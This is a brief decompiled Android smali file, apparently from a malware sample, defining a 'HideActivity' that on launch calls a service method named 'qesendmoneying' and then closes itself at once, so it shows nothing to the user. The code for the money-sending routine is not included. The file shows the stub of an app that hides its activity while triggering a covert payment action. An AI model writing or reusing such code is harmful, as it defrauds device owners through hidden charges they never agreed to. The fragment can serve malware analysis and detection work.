.class public Lbarak/obama/badgirl/HideActivity;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-static {}, Lbarak/obama/badgirl/BigService;->qesendmoneying()V

    invoke-virtual {p0}, Lbarak/obama/badgirl/HideActivity;->finish()V

    return-void
.end method
